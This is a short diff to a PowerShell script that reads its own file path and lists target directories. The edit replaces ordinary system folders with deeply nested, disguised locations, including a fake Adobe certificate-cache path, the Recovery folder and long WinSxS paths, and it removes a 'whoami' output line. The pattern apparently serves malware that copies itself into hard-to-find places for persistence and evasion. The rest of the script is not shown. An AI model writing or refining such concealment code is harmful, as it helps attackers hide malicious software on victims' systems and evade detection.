@@ -4,12 +4,12 @@ param(
 )
 $curr = $MyInvocation.MyCommand.Path
 $paths = @(
-    "$env:windir\system32\config\systemprofile\AppData\Local",
-    "$env:windir\System32\WindowsPowerShell\v1.0\Modules",
-    "$env:windir\System32\drivers\etc",
-    "$env:windir\System32\LogFiles\WMI"
+    ($env:systemdrive+"\Users\$user\AppData\Roaming\Adobe\Acrobat\DC\Security\OCSP\CertCache\Backup\Logs\dump"),
+    ($env:systemdrive + "\Recovery"),
+    "$env:windir\WinSxS\FileMaps\programdata_microsoft_windows_wer_temp_783673b09e921b6b-cdf_ms\Windows\System32\Tasks\Microsoft\Windows\PLA\Diagnostics\Traces",
+    "$env:windir\WinSxS\Temp\PendingRenames\Pending\ManifestCache"
 )
-whoami | Out-File "C:\init_service_fwd.txt"
+
 
 $arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture
 if($arch -eq "64-bit"){
